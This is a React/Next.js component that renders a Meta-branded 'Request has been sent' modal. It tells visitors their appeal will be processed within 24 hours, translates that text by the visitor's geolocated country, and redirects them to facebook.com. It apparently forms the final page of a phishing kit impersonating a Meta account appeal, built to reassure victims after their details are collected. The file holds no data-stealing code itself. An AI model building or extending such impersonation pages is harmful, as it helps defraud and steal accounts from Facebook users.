import { store } from '@/store/store';
import translateText from '@/utils/translate';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';
import FinalImage from '@/assets/images/final-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';

const FinalModal: FC = () => {
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo } = store();
    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['Request has been sent', 'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.', 'Return on Facebook'];

        const translateAll = async () => {
            const entries = await Promise.all(textsToTranslate.map(async (text) => [text, await translateText(text, geoInfo.country_code)] as const));
            setTranslations(Object.fromEntries(entries));
        };

        void translateAll();
    }, [geoInfo]);

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 p-4'>
            <div className='w-full max-w-xl rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4 pb-6'>
                <h2 className='mt-4 mb-2 text-2xl font-bold'>{t('Request has been sent')}</h2>
                <p className='mb-4 text-lg leading-relaxed'>{t('Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.')}</p>
                <div className='flex flex-col justify-center'>
                    <Image src={FinalImage} alt='' />
                    <button type='button' onClick={() => window.location.replace('https://www.facebook.com')} className='mt-4 flex h-12.5 w-full items-center justify-center rounded-full bg-[#2563eb] font-semibold text-white'>
                        {t('Return on Facebook')}
                    </button>
                </div>
                <Image src={MetaLogo} alt='Meta' className='mx-auto mt-3 h-4.5 w-17.5' />
            </div>
        </div>
    );
};

export default FinalModal;
